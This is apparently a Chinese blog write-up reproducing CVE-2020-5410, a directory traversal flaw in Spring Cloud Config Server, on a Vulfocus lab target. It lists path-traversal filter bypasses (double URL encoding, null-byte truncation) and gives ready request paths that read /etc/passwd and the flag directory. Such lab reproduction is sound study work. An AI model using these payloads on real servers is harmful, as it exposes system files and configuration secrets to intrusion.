# 原创
：  【漏洞复现-spring-目录遍历】vulfocus/spring-cve_2020_5410

# 【漏洞复现-spring-目录遍历】vulfocus/spring-cve_2020_5410

**目录**

[一、靶场环境](#%E4%B8%80%E3%80%81%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83)

[1.1、平台：](#1.1%E3%80%81%E5%B9%B3%E5%8F%B0%EF%BC%9A)

[1.2、知识：](#1.2%E3%80%81%E6%BC%8F%E6%B4%9E%E7%89%88%E6%9C%AC%3A)

[1.3、描述：](#1.3%E3%80%81%E6%8F%8F%E8%BF%B0%EF%BC%9A)

[二、漏洞验证](#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81)

[2.1、分析：](#2.1%E3%80%81%E5%88%86%E6%9E%90%EF%BC%9A)

---


## 一、靶场环境

> 
<h3>1.1、平台：</h3>
[Vulfocus 漏洞威胁分析平台](https://vulfocus.cn/)
123.58.224.8:43117
123.58.224.8:20746

 <img alt="" height="368" src="https://img-blog.csdnimg.cn/623abb48531b4490b0c1ade2e51958ba.png" width="1064"/>
 



> 
<h3>1.2、知识：</h3>
1、跳目录
../上一级
（有时候可能需要考虑绕过过滤）
单次过滤：....//
正则匹配斜杠：..%252f(双重URL编码，因为浏览器会解码一次)
起始路径匹配：起始路径+相对路径结合绕过
后缀检测：空字节绕过（%00截断）../etc/passwd%00.png
……


> 
<h3>1.3、描述：</h3>
Spring Cloud Config，2.2.3之前的2.2.x版本，2.1.9之前的2.1.x版本以及较旧的不受支持的版本允许应用程序通过spring-cloud-config-server模块提供任意配置文件。恶意用户或攻击者可以使用特制URL发送请求，这可能导致目录遍历攻击。


---


---


## 二、漏洞验证

> 
<h3>2.1、分析：</h3>
对/进行了2次URL编码
/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fpasswd%23foo/development

读取flag文件
/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%23foo/development 

 

